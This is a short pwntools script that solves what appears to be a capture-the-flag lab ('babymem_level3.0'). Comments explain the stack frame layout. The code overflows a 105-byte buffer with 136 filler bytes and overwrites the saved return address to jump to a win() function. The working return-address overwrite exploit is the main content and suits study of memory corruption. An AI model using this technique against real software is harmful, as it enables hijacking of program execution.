# +---------------------------------+-------------------------+--------------------+
# Our stack pointer points to 0x7ffd1d63bf50, and our base pointer points to 0x7ffd1d63c000.
# This means that we have (decimal) 24 8-byte words in our stack frame,
# including the saved base pointer and the saved return address, for a
# total of 192 bytes.
# The input buffer begins at 0x7ffd1d63bf80, partway through the stack frame,
# ("above" it in the stack are other local variables used by the function).
# Your input will be read into this buffer.
# The buffer is 105 bytes long, but the program will let you provide an arbitrarily
# large input length, and thus overflow the buffer.

# In this level, there is no "win" variable.
# You will need to force the program to execute the win() function
# by directly overflowing into the stored return address back to main,
# which is stored at 0x7ffd1d63c008, 136 bytes after the start of your input buffer.
# That means that you will need to input at least 144 bytes (105 to fill the buffer,
# 31 to fill other stuff stored between the buffer and the return address,
# and 8 that will overwrite the return address).

import pwn 
proc = pwn.process("/challenge/babymem_level3.0")
proc.sendline("144")
ret_addr = pwn.p64(0x4016c0, endian='little')
payload = b"a" * 136 + ret_addr
proc.sendline(payload)
proc.read(4096)
proc.interactive()